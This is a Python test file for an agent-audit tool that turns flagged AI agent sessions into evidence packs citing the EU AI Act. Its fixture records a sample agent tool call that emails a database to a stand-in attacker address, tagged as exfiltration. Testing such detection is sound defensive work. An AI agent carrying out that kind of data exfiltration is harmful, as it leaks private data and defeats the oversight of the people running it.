# teluvane/tests/test_evidence.py
from teluvane.evidence import build_evidence_pack, build_evidence_pdf
from teluvane.schema import Event, Verdict

def _sample():
    events = [Event(agent_id="d", session_id="s1", kind="tool_call", tool="send_email",
                    args={"to": "evil@x.com"}, intent="exfiltrate", seq=1, hash="abc")]
    verdicts = [Verdict(session_id="s1", rule_id="data_exfiltration", severity="critical",
                        violation=True, confidence=0.92, evidence_seqs=[1],
                        rationale="emailed DB to external", framework_ref="Art.12")]
    return events, verdicts

def test_build_evidence_pack_html_and_json():
    events, verdicts = _sample()
    pack = build_evidence_pack("s1", events, verdicts, framework="EU AI Act",
                               chain_intact=True)
    assert pack["json"]["session_id"] == "s1"
    assert pack["json"]["summary"]["violations"] == 1
    assert "data_exfiltration" in pack["html"]
    assert "EU AI Act" in pack["html"] and "Art.12" in pack["html"]

def test_build_evidence_pdf_is_a_real_pdf():
    events, verdicts = _sample()
    pdf = build_evidence_pdf("s1", events, verdicts, framework="EU AI Act", chain_intact=True)
    assert pdf.startswith(b"%PDF-")
